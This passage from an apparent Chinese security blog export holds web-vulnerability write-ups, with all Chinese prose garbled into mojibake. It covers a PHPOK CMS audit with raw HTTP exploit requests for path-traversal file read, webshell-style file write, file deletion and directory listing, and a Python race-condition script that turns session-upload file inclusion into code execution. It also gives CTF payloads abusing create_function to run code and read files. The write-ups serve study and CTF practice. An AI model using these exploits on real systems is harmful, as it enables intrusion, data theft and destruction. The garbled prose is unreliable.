Ë∑ØÁî±Êñá‰ª∂‰∏≠‰ºöËá™Âä®Â∞ÜfÂèÇÊï∞ÊúÄÂêéÂä†ÂÖ•_f ÂèçËßÇÔºåÊØîÂ¶ÇÊàë‰ª¨Ë¶ÅË∞ÉÁî®framework/admin/freight_control.phpÁöÑprice_save_f()ÊñπÊ≥ïÔºö ÂØπÂ∫îÁöÑurlÂç≥Ôºöhttps://phpok/admin.php?c=freight&amp;f=price_save Âç≥Âú®ÊéßÂà∂Âô®‰∏≠ÔºåÂè™Êúâ‰ª•_fÁªìÂ∞æÁöÑÂáΩÊï∞ÂêçÂèØ‰ª•Áõ¥Êé•Ë∞ÉÁî® Áü•ÈÅìÊñá‰ª∂Ëß£ÊûêËßÑÂàô‰∫ÜÔºå‰∏ãÈù¢Â∞±ÂèØ‰ª•‰ªéÂÖ•Âè£ÂºÄÂßãÂÆ°ÔºåÂÆ°ÂÖ®Â±ÄËøáÊª§ÔºåÂÆ°Áõ∏ÂÖ≥ÊïèÊÑüÂáΩÊï∞ËøõË°åÂõûÊ∫ØÁ≠âÁ≠â„ÄÇ ÂèòÈáèË¶ÜÁõñ‰ªéÊ°ÜÊû∂ÂÖ•Âè£Ë∑üËøõÂêéÔºåÂèëÁé∞framework/init.php 1611Ë°åÂ≠òÂú®parse_strÂèòÈáèË¶ÜÁõñ $query_stringÂèÇÊï∞‰ªéframework/libs/server.php 94Ë°å‰º†ÂÖ•Ôºö ÊØîÂ¶ÇËÆøÈóÆÔºöhttps://phpok/?data[script]=passer6y Â¶ÇÊûúÊÉ≥Ë¶ÅÂà©Áî®ÁöÑËØùÊúÄÂ•ΩÊòØËÉΩË¶ÜÁõñÂÖ®Â±ÄÂèòÈáèÔºå$_SESSIONÔºå$configËøô‰∫õÔºåÊàëÂú®Â∞ùËØïË¶ÜÁõñ$_SESSIONÁöÑÊó∂ÂÄô‰º†ÂÖ•?_SESSION[script]=passer6y,ÁªèËøáÂä®ÊÄÅË∞ÉËØïÂêéÔºåÂèëÁé∞‰ºöËá™Âä®Â§öÂä†‰∏Ä‰∏™‰∏ãÂàíÁ∫øÔºåÂèòÊàêËøôÊ†∑__SESSION[script]=passer6y„ÄÇ ÂêéÊù•‰πüÂ∞ùËØï‰∫ÜÂà©Áî®$_GETÂèòÈáèÁöÑ‰∏Ä‰∫õÁâπÊÄßÂú®Â§ÑÁêÜÂèÇÊï∞ÁöÑÊó∂ÂÄôÔºå‰ºöÂ∞ÜÂèÇÊï∞Âêç‰∏≠ÁöÑÁ©∫Ê†º„ÄÅ.„ÄÅ[ÊõøÊç¢Êàê_ÔºåÊØîÂ¶Ç‰º†ÂÖ•.SESSION[script]=passer6y‰ºöËß£ÊûêÊàê_SESSION[script]=passer6yÔºå‰ΩÜÊúÄÁªàËøòÊòØÊ≤°ÊúâÊàêÂäüË¶ÜÁõñÔºåÂ∏àÂÇÖ‰ª¨ÊúâÂ•ΩÁöÑÊÄùË∑Ø‰∏ÄËµ∑Êù•‰∫§ÊµÅ‰∫§ÊµÅ~ ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ËØªÂèñË∑üÂÆåÊ°ÜÊû∂ÂÖ•Âè£Ê†∏ÂøÉÊñá‰ª∂‰πãÂêéÔºåÁÑ∂ÂêéËøõÊ°ÜÊû∂ÁõÆÂΩïÁöÑwwwÊ®°Âùó,Ë∑üÂÆå‰∫Ü‰πüÊ≤°ÊåñÂà∞‰∏Ä‰∏™Ê¥ûÔºåÊé•ÁùÄÂ∞±ÂºÄÂßãÂÆ°Ê†∏ÂøÉÁöÑlibsÂ∫ìÔºåÁúãÂäüËÉΩÁÇπÊù•ÂõûÊ∫ØÔºåÊé•ÁùÄÂ∞±ÊâæÂà∞‰∫ÜËøô‰πà‰∫õÂêéÂè∞Ê¥ûÔºö ÂΩìÊó∂Âú®ÂÆ°Ê°ÜÊû∂ÈáåÈù¢ÁöÑlibsÂ∫ìÈáåÁöÑfile.phpÔºåÁúãÂà∞catÂëΩ‰ª§ÁúºÂâç‰∏Ä‰∫Æ ÂõûÊ∫ØÂà∞‰∫ÜÔºöframework/admin/tpl_control.php framework/admin/appsys_control.php Êúâ‰∏§Â§ÑÂùáÂ≠òÂú®ËØ•ÈóÆÈ¢òÔºö exp1:123456789101112POST /admin.php?c=appsys&amp;f=file_edit&amp;id=fav&amp;title=../../../../../../../etc/passwd HTTP/1.1Host: phpokCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3690.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: PHPSESSION=ilc9ev2s0fv8rn9hckfh07hni3; XDEBUG_SESSION=PHPSTORMConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0 exp2:123456789101112POST /admin.php?c=tpl&amp;f=edit&amp;id=1&amp;title=../../../../../../../etc/passwd HTTP/1.1Host: phpokCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3690.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: PHPSESSION=ilc9ev2s0fv8rn9hckfh07hni3; XDEBUG_SESSION=PHPSTORMConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0 ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•getshelllibsÂ∫ìÊó∂ÂÄôÂèëÁé∞ÁöÑÔºåframework/libs/file.php 108Ë°åÔºö Ë∑üËøõmake()ÂáΩÊï∞Ôºå185Ë°åÔºöÂèØ‰ª•ÁúãÂà∞ÊòØÁî®Êù•ÂàõÂª∫Êñá‰ª∂ÊàñÁõÆÂΩïÁöÑÂáΩÊï∞ ÁªßÁª≠Ë∑ü_write()ÂáΩÊï∞ÔºåÂêåÊñá‰ª∂394Ë°åÔºöËâØÂøÉÁöÑÁ®ãÂ∫èÂëòËøòÂ∏ÆÊàë‰ª¨ÊääËΩ¨‰πâÁ¨¶ÁªôÂéªÊéâ‰∫Ü ÂàÜÊûêÂà∞ËøôÈáåÂü∫Êú¨ÂèØ‰ª•Áü•ÈÅìÂ¶ÇÊûúvim()ÂáΩÊï∞ÂèØÊéßÔºåÈÇ£‰πàÂèØ‰ª•ÂÜôÂÖ•‰ªªÊÑèÊñá‰ª∂ ‰ΩøÁî®phpstorm command+shift+fÂÖ®Â±ÄÊêúÁ¥¢ Âú®framework/admin/tpl_control.phpÁöÑ383Ë°åÊâæÂà∞edit_save_f() ‰∏ãÈù¢ÊûÑÈÄ†expÂ∞±ÂæàÁÆÄÂçï‰∫Ü„ÄÇ exp:123456789101112POST /admin.php?c=tpl&amp;f=edit_save&amp;id=1&amp;title=../../../../../../../Users/passer6y/Documents/www/phpok/version.php&amp;content=&lt;%3fphp+phpinfo()%3becho+&quot;passer6y&quot;%3b%3f&gt; HTTP/1.1Host: phpokCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3690.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: PHPSESSION=ilc9ev2s0fv8rn9hckfh07hni3; XDEBUG_SESSION=PHPSTORMConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0 Âú®framework/admin/tpl_control.php 383Ë°å edit_save_f()ÂáΩÊï∞‰πüÊúâËøô‰∏™ÈóÆÈ¢ò ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂Âà†Èô§ÂêåÊ†∑Á±ª‰ººÁöÑÊñπÊ≥ïÂú®framework/admin/tpl_control.php 303Ë°å delfile_f()ÂáΩÊï∞Ôºö Âú®libsÂ∫ì‰∏≠Ôºåframework/libs/file.phpÔºå148Ë°årm()ÂáΩÊï∞‰πüÂ≠òÂú®ËØ•ÈóÆÈ¢ò expÔºö123456789101112POST /admin.php?c=tpl&amp;f=delfile&amp;id=1&amp;title=../../../../../../../Users/passer6y/Documents/www/phpok/version.php HTTP/1.1Host: phpokCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3690.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: PHPSESSION=ilc9ev2s0fv8rn9hckfh07hni3; XDEBUG_SESSION=PHPSTORMConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0 ÂêéÂè∞Êñá‰ª∂ÈáçÂëΩÂêçËøôÁßçÊºèÊ¥ûÂè™ËÉΩÂíåÂÖ∂‰ªñÊ¥ûÊâìÁªÑÂêàÊã≥Âà©Áî®ÊâçËÉΩÁé© framework/admin/tpl_control.php 182Ë°åÔºö Ë∑üËøõ215Ë°åÔºö$this-&gt;lib(&#39;file&#39;)-&gt;mv($file,$newfile); framework/libs/file.php 269Ë°åÔºö Âà©Áî®Êù°‰ª∂ÊØîËæÉÂ§öÔºåÂæóÁü•ÈÅìÊñá‰ª∂ÂêçÔºåÂÖ∂Ê¨°ÊÉ≥ÊãøshellÁöÑËØùÔºåÂæóÊÉ≥ÂäûÊ≥ïÂÜôÂÖ•Ëá™Â∑±ÁöÑshell,ÊØîÂ¶ÇÊÉ≥ÂäûÊ≥ïÂÜôÂà∞ÁºìÂ≠òÈáåÊàñËÄÖÂÖ∂‰ªñÁöÑÔºåÁÑ∂ÂêéÊääÂéüÊú¨‰∏çËÉΩÂΩìphpËß£ÊûêÁöÑÊîπÊàêphpÊâ©Â±ïÂêçÁ≠âÁ≠â.. ÂêéÂè∞ÂàóÁõÆÂΩïframework/admin/appsys_control.php 358Ë°å filelist_f() $tpl_list = $this-&gt;lib(&#39;file&#39;)-&gt;ls($tpl_dir); 388Ë°å Ë∑üËøõÔºö Ëá≥‰∫éid‰º†ÂÖ•Âï•ÂèÇÊï∞ÔºåÂèØ‰ª•Ê†πÊçÆËøô‰∏™$rs = $this-&gt;model(&#39;tpl&#39;)-&gt;get_one($id);Ê†πÊçÆË∑ØÁî±Ë∑üËøõÂà∞Ôºöframework/model/appsys.php 117Ë°åÔºöidÂØπÂ∫îÁùÄ_appÁõÆÂΩï‰∏ãÁöÑÊñá‰ª∂Âêç expÔºö1234567891011121314GET /admin.php?c=appsys&amp;f=filelist&amp;id=fav&amp;folder=../../../../ HTTP/1.1Host: phpokUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.8d Safari/537.36content-type: application/jsonAccept: application/json, text/javascript, */*; q=0.01PHPSESSION: ilc9ev2s0fv8rn9hckfh07hni3X-Requested-With: XMLHttpRequestrequest_type: ajaxphpok_ajax: 1Referer: https://phpok/index.php?id=news&amp;cate=companyAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: PHPSESSION=ilc9ev2s0fv8rn9hckfh07hni3Connection: close ËÉåÈîÖÁöÑfileÊñá‰ª∂Ôºöframework/libs/file.php‚Ä¶ ËÉΩÂäõÊúâÈôê,Âè™ËÉΩÊåñÂá∫Ëøô‰πà‰∫õÈ∏°ËÇãÊ¥ûÔºåÂ∏åÊúõÂêÑ‰ΩçÂ∏àÂÇÖÂ§öÂ§öÊåáÁÇπ~]]></content>
      <tags>
        <tag>Web</tag>
        <tag>‰ª£Á†ÅÂÆ°ËÆ°</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpÂèçÂ∫èÂàóÂåñÂéüÁîüÁ±ªÂà©Áî®]]></title>
    <url>%2F2019%2F03%2F05%2Fphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Ê¢≥ÁêÜÂíåÊÄªÁªì‰∫Ü‰∏Ä‰∏ãÊúÄËøëÂ≠¶ÁöÑ‰∏úË•ø~ Ëß¶ÂèëpharÊó†unserialize()ÂèçÂ∫èÂàóÂåñÂà©Áî®Êù°‰ª∂Ôºö ‰∏Ä‰∏™‰∏ä‰º†ÁÇπ ‰∏Ä‰∏™ÂèØÊéßÁöÑÊñá‰ª∂Êìç‰ΩúÂáΩÊï∞Ôºö1fileatime„ÄÅfilectime„ÄÅfile_exists„ÄÅfile_get_contents„ÄÅfile_put_contents„ÄÅfile„ÄÅfilegroup„ÄÅfopen„ÄÅfileinode„ÄÅfilemtime„ÄÅfileowner„ÄÅfileperms„ÄÅis_dir„ÄÅis_executable„ÄÅis_file„ÄÅis_link„ÄÅis_readable„ÄÅis_writable„ÄÅis_writeable„ÄÅparse_ini_file„ÄÅcopy„ÄÅunlink„ÄÅstat„ÄÅreadfile„ÄÅmd5_file„ÄÅfilesize HpdogerÂ∏àÂÇÖÁöÑÂõõ‰∏™ÂÆû‰æãÈÄíËøõphpÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁêÜËß£BlackhatËÆÆÈ¢òËß£ËØª | pharÂèçÂ∫èÂàóÂåñ sessionÂèçÂ∫èÂàóÂåñÂà©Áî®Êù°‰ª∂Ôºö sessionËß£ÊûêÂºïÊìéÂèØÊéß(Âú®Âêå‰∏ÄÁΩëÁ´ôËÉΩÂêåÊó∂Âá∫Áé∞‰∏§Áßç‰∏çÂêåÁöÑsessionÈÖçÁΩÆÊñπÂºè) $_SESSIONÂÄºÂèØÊéß ‰øÆÊîπsessionÂ≠òÂÇ®ÊñπÂºèÂèØ‰ª•ÈÄöËøásession_start()ÂáΩÊï∞ÔºåÁªôÂÖ∂‰º†ÂÖ•serialize_handler=php_serializeÂèÇÊï∞Âç≥ÂèØ„ÄÇÂÖ∑‰ΩìËßÅÔºöLCTF 2018 Babyphp‚Äôs revenge phpÂéüÁîüÁ±ªÂà©Áî®SoapclientÂà©Áî®Êù°‰ª∂Ôºö ÈúÄË¶ÅÊúâsoapÊâ©Â±ï ÈúÄË¶ÅÊúâ‰∏Ä‰∏™ËÉΩÂÆû‰æãÂåñÂØπË±°ÁöÑÁÇπ ÈúÄË¶ÅË∞ÉÁî®‰∏Ä‰∏™‰∏çÂ≠òÂú®ÁöÑÊñπÊ≥ïËß¶ÂèëÂÖ∂__call()ÂáΩÊï∞ ÂèÇËÄÉÔºöLCTF 2018 Babyphp‚Äôs revenge Âç±ÂÆ≥ÔºöÁõ≤ÊâìSSRF:ÂèØ‰ª•ÁªìÂêàSoapclientËá™Ë∫´ÁöÑCRLFÊºèÊ¥ûÔºåÂ∏¶‰∏äÂêÑÁßçheadeÂ§¥ÂèÇÊï∞„ÄÇ ÂèÇËÄÉ: ÂèçÂ∫èÂàóÂåñ‰πãPHPÂéüÁîüÁ±ªÁöÑÂà©Áî® GlobIteratorÂà©Áî®Êù°‰ª∂Ôºö ÊúâÂÆû‰æãÂåñÂØπË±°ÁöÑÁÇπÂç≥ÂèØ Âç±ÂÆ≥ÔºöÂàóÁõÆÂΩï ÂèÇËÄÉÔºöPHP SECURITY CALENDAR 2017-Day 3 - Snow Flake SimpleXMLElementÂà©Áî®Êù°‰ª∂Ôºö xmllibÂ∫ì‰∏∫Â≠òÂú®ÊºèÊ¥ûÁöÑÁâàÊú¨ ÊúâÂÆû‰æãÂåñÂØπË±°ÁöÑÁÇπÂç≥ÂèØ Âç±ÂÆ≥Ôºö ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ SSRF Áõ≤ÊâìxxeÂßøÂäøËßÅÂèÇËÄÉÈìæÊé• ÂèÇËÄÉÔºöPHP SECURITY CALENDAR 2017-Day 3 - Snow Flake ÂèÇËÄÉÔºöXMLÂ§ñÈÉ®ÂÆû‰ΩìÊ≥®ÂÖ•Â∞èÁªì]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Êñá‰ª∂ÂåÖÂê´Â∞èÁªì]]></title>
    <url>%2F2019%2F03%2F05%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[Ê¢≥ÁêÜÂíåÊÄªÁªì‰∫Ü‰∏Ä‰∏ãÊúÄËøëÂ≠¶ÁöÑ‰∏úË•ø~ ÂåÖÂê´SESSIONÊñá‰ª∂pÂ∏àÂÇÖÂ∞èÂØÜÂúàÈáåÂ≠¶Âà∞‰∫Ü‰∏ÄÁßçÊñá‰ª∂ÂåÖÂê´getshellÁöÑÂà©Áî®ÊÄùË∑ØÔºöÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûÂú®Êâæ‰∏çÂà∞ÂèØÂåÖÂê´ÁöÑÊñá‰ª∂ÔºåÂèØ‰ª•ÂåÖÂê´sessionÊñá‰ª∂‰ªéËÄågetshell„ÄÇ ÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºåsession.use_strict_modeÂÄºÊòØ0„ÄÇÊ≠§Êó∂Áî®Êà∑ÊòØÂèØ‰ª•Ëá™Â∑±ÂÆö‰πâSession IDÁöÑ„ÄÇÊØîÂ¶ÇÔºåÊàë‰ª¨Âú®CookieÈáåËÆæÁΩÆPHPSESSID=zsxqzsxqÔºåPHPÂ∞Ü‰ºöÂú®ÊúçÂä°Âô®‰∏äÂàõÂª∫‰∏Ä‰∏™Êñá‰ª∂Ôºö/tmp/sess_zsxqzsxq Âú®phpmyadmin 4.8.1 Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûÔºàCVE-2018-12613Ôºâ‰∏≠Âà©Áî®‰∫ÜËøô‰∏™ÊÄùË∑Ø‰ªéÊñá‰ª∂ÂåÖÂê´Âà∞getshell ËØ•ÊäÄÂ∑ßÂà©Áî®Êù°‰ª∂ÔºöÊúçÂä°Âô®‰∏äÈúÄË¶ÅÂ∑≤ÁªèÂàùÂßãÂåñSession ÈÄöÁî®ÁöÑÂàùÂßãÂåñÊñπÊ≥ïÔºösession_start() pÂ∏àÂÇÖÂú®Â∞èÂØÜÂúàËß£ËØªphpinfoÂ≠¶Âà∞‰∫ÜÂÖ∂‰ªñÁöÑÂàùÂßãÂåñsessionÊÄùË∑ØÔºöhttps://t.zsxq.com/2nQbAYr ÈÖçÁΩÆÈ°πÔºösession.auto_startÂ¶ÇÊûúÂºÄÂêØËøô‰∏™ÈÄâÈ°πÔºåÂàôPHPÂú®Êé•Êî∂ËØ∑Ê±ÇÁöÑÊó∂ÂÄô‰ºöËá™Âä®ÂàùÂßãÂåñSessionÔºå‰∏çÂÜçÈúÄË¶ÅÊâßË°åsession_start()„ÄÇ‰ΩÜÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºå‰πüÊòØÈÄöÂ∏∏ÊÉÖÂÜµ‰∏ãÔºåËøô‰∏™ÈÄâÈ°πÈÉΩÊòØÂÖ≥Èó≠ÁöÑ„ÄÇ ÈÖçÁΩÆÈ°πÔºösession.upload_progressÊúÄÂàùÊòØPHP‰∏∫‰∏ä‰º†ËøõÂ∫¶Êù°ËÆæËÆ°ÁöÑ‰∏Ä‰∏™ÂäüËÉΩÔºåÂú®‰∏ä‰º†Êñá‰ª∂ËæÉÂ§ßÁöÑÊÉÖÂÜµ‰∏ãÔºåPHPÂ∞ÜËøõË°åÊµÅÂºè‰∏ä‰º†ÔºåÂπ∂Â∞ÜËøõÂ∫¶‰ø°ÊÅØÊîæÂú®Session‰∏≠ÔºàÂåÖÂê´Áî®Êà∑ÂèØÊéßÁöÑÂÄºÔºâÔºåÂç≥‰ΩøÊ≠§Êó∂Áî®Êà∑Ê≤°ÊúâÂàùÂßãÂåñSessionÔºåPHP‰πü‰ºöËá™Âä®ÂàùÂßãÂåñSession„ÄÇÈªòËÆ§ÊÉÖÂÜµ‰∏ãsession.upload_progress.enabledÊòØ‰∏∫OnÁöÑ„ÄÇ ÊâÄ‰ª•ÂèØ‰ª•Âà©Áî®ËøôÁÇπÊàë‰ª¨ÂèØ‰ª•ÊûÑÈÄ†Â¶Ç‰∏ãÊï∞ÊçÆÂåÖ123456789101112131415161718192021222324252627282930POST /test.php HTTP/1.1Host: 127.0.0.1Content-Length: 436Cache-Control: max-age=0Origin: https://127.0.0.1Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryetzSsuG4Wg73Ob9RUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.9d Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: https://127.0.0.1/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: PHPSESSID=passer6yConnection: close------WebKitFormBoundaryetzSsuG4Wg73Ob9RContent-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;Content-Type: text/plain aaaa------WebKitFormBoundaryetzSsuG4Wg73Ob9RContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;flag.txt&quot;Content-Type: text/plain flag------WebKitFormBoundaryetzSsuG4Wg73Ob9RContent-Disposition: form-data; name=&quot;submit&quot;Submit------WebKitFormBoundaryetzSsuG4Wg73Ob9R-- ‰ªé‰∏äÂõæÁúãÂà∞ÔºåÊàë‰ª¨ÂàõÂª∫‰∫Ü‰∏Ä‰∏™Âêç‰∏∫sess_passer6y,‰ΩÜÊòØÊñá‰ª∂ÂÜÖÂÆπÂ§ßÂ∞èÊòØ0ÔºåÂõ†‰∏∫‰∏ä‰º†ÁªìÊùüÂêéÔºåËøô‰∏™SessionÂ∞Ü‰ºöË¢´Ëá™Âä®Ê∏ÖÈô§ÔºàÁî±session.upload_progress.cleanupÂÆö‰πâÔºâÔºåÊàë‰ª¨Âè™ÈúÄË¶ÅÊù°‰ª∂Á´û‰∫âÔºåËµ∂Âú®Êñá‰ª∂Ë¢´Ê∏ÖÈô§ÂâçÂà©Áî®Âç≥ÂèØ„ÄÇ ÊâÄ‰ª•ÔºåÂè™Ë¶ÅÂ≠òÂú®‰∏Ä‰∏™Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û,Êàë‰ª¨Â∞±ÂèØ‰ª•Âà©Áî®Ëøô‰∫õÈªòËÆ§ÁöÑÁâπÊÄßÊù•GetshellÔºö Â§çÁé∞ÁéØÂ¢ÉÔºöphp 7.0.21 index.php1234&lt;?php if (isset($_GET[&apos;file&apos;])) &#123; include &apos;./&apos; . $_GET[&apos;file&apos;]; &#125; ÊûÑÈÄ†‰ª•‰∏ã‰∏§‰∏™Êï∞ÊçÆÂåÖÔºåÂèëÈÄÅÂà∞ÁàÜÁ†¥Ê®°ÂùóÔºånull payloadÁàÜÁ†¥Âç≥ÂèØ ‰∏çÂèØÂèñ.. ËøôÁßçÊñπÊ≥ï‰ºöÈÄ†ÊàêÂ§ßÈáèsession‰∏¥Êó∂Êñá‰ª∂ ËøòÊòØÁî®pÂ∏àÂÇÖÁªôÁöÑexpÂêßÔºö123456789101112131415161718192021222324252627282930import ioimport requestsimport threadingsessid = &apos;passer6y&apos;def t1(session): while True: f = io.BytesIO(b&apos;a&apos; * 1024 * 50) response = session.post( &apos;https://localhost/test.php&apos;, data=&#123;&apos;PHP_SESSION_UPLOAD_PROGRESS&apos;: &apos;&lt;?=phpinfo()?&gt;&apos;&#125;, files=&#123;&apos;file&apos;: (&apos;a.txt&apos;, f)&#125;, cookies=&#123;&apos;PHPSESSID&apos;: sessid&#125; )def t2(session): while True: response = session.get(f&apos;https://127.0.0.1/index.php?file=../../../../../../../../tmp/sess_&#123;sessid&#125;&apos;) print(response.text)with requests.session() as session: t1 = threading.Thread(target=t1, args=(session, )) t1.daemon = True t1.start() t2(session) ÂèÇËÄÉÔºöphpmyadmin 4.8.1 Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û ÈÖçÂêàphpinfo,ÂåÖÂê´‰∏ä‰º†‰∏¥Êó∂Êñá‰ª∂ÂèÇËÄÉÁ¨îËÆ∞Ôºö https://app.yinxiang.com/shard/s17/sh/e1cdae4e-d4c3-4595-8bfb-03eff04c4cdb/6b917c87b16133fbcbd60070b579ef2f ÂåÖÂê´Êó•ÂøóÂèÇËÄÉÁ¨îËÆ∞Ôºö https://app.yinxiang.com/shard/s17/sh/e1cdae4e-d4c3-4595-8bfb-03eff04c4cdb/6b917c87b16133fbcbd60070b579ef2f Ëá™ÂåÖÂê´ÊºèÊ¥ûÂèÇËÄÉÁ¨îËÆ∞Ôºö https://app.yinxiang.com/shard/s17/sh/e1cdae4e-d4c3-4595-8bfb-03eff04c4cdb/6b917c87b16133fbcbd60070b579ef2f ÂèÇËÄÉÊñáÁ´†Ôºöhttps://www.anquanke.com/post/id/153376]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Code-Breaking Write Up]]></title>
    <url>%2F2019%2F03%2F03%2FCode-Breaking%20Write%20Up%2F</url>
    <content type="text"><![CDATA[functionsource:123456789101112&lt;?php$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;//D Â¶ÇÊûú‰ΩøÁî®$ÈôêÂà∂ÁªìÂ∞æÂ≠óÁ¨¶,Âàô‰∏çÂÖÅËÆ∏ÁªìÂ∞æÊúâÊç¢Ë°å; //i ‰∏çÂå∫ÂàÜ(ignore)Â§ßÂ∞èÂÜôÔºõ//s ÁâπÊÆäÂ≠óÁ¨¶ÂúÜÁÇπ . ‰∏≠ÂåÖÂê´Êç¢Ë°åÁ¨¶if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123; show_source(__FILE__);&#125; else &#123; $action(&apos;&apos;, $arg);&#125; ÂèØ‰ª•‰ΩøÁî®create_function(),Áî®Ê≥ïÔºöhttps://php.net/manual/zh/function.create-function.php Âç≥Á¨¨‰∏Ä‰∏™‰∏∫ÂèÇÊï∞Êñ∞Âª∫ÂáΩÊï∞ÁöÑÂèÇÊï∞ÔºåÁ¨¨‰∫å‰∏™ÂèÇÊï∞‰∏∫‰ª£Á†Å„ÄÇ create_function(&#39;&#39;,&#39;$GET_[&#39;fname&#39;]&#39;) Á≠â‰ª∑‰∫é function f() { $GET_[&#39;fname&#39;]; } ‰∫éÊòØ‰º†ÂÖ•ÂèÇÊï∞‰∏∫ 1;}phpinfo();/*Âç≥ function f(){1;}phpinfo();/*} ËøôÈáå$actionËøòÈúÄË¶ÅÁªï‰∏Ä‰∏ãÊ≠£ÂàôÔºå‰ΩøÁî®\ÁªïËøáÔºå\func()Ë°®Á§∫Ë∞ÉÁî®ÂÖ®Â±ÄÁ©∫Èó¥ÁöÑÂáΩÊï∞ÔºåÂ¶ÇÊûúÁõ¥Êé•ÂÜôÂáΩÊï∞Âêçfun()Ë∞ÉÁî®ÔºåË∞ÉÁî®ÁöÑÊó∂ÂÄôÂÖ∂ÂÆûÁõ∏ÂΩì‰∫éÂÜô‰∫Ü‰∏Ä‰∏™Áõ∏ÂØπË∑ØÂæÑÔºåËÄåÁî®\func()ÔºåÂç≥‰ΩøÁî®ÁöÑÊòØÁªùÂØπË∑ØÂæÑ„ÄÇ ÊãøÂà∞phpinfo(): ?action=\create_function&amp;arg=1;}phpinfo();/* ÂàóÊñá‰ª∂Ôºö?action=\create_function&amp;arg=1;}var_dump(scandir(&#39;/var/www&#39;));/* ËØªflagÔºö action=\create_function&amp;arg=1;}var_dump(file_get_contents(&quot;../flag_h0w2execute_arb1trary_c0de&quot;));/* ÊåÅÁª≠Êõ¥Êñ∞ing]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[35C3-POST WriteUp]]></title>
    <url>%2F2019%2F02%2F18%2F35C3-POST%20WriteUp%2F</url>
    <content type="text"><![CDATA[È¢òÁõÆ&amp;wpÈìæÊé•Ôºöhttps://github.com/eboda/35c3/tree/master/post 35C3-POSThint: flag is in dbHint2: the lovely XSS is part of the beautiful design and insignificant for the challengeHint3: You probably want to get the source code, luckily for you it‚Äôs rather hard to configure nginx correctly. ÂäüËÉΩÁÇπÂæàÁÆÄÂçïÔºåÊ≥®ÂÜåÔºåÁôªÂΩïÔºå‰∏ä‰º†Êñá‰ª∂ÔºåËØÑËÆ∫„ÄÇ ÊµãËØï‰∫Ü&lt; &gt;Ë¢´ÂÆû‰ΩìÁºñÁ†ÅÔºå‰∏ä‰º†phpÊñá‰ª∂‰∏çËß£Êûê„ÄÇ ÊèêÁ§∫xssÊó†Áî®ÔºånginxÈÖçÁΩÆÊúâÈóÆÈ¢òÔºåÂú®Vulhub‰∏≠ÊèêÂà∞‰∫ÜÂ∏∏ËßÅÁöÑnginxÈÖçÁΩÆÈóÆÈ¢ò„ÄÇ 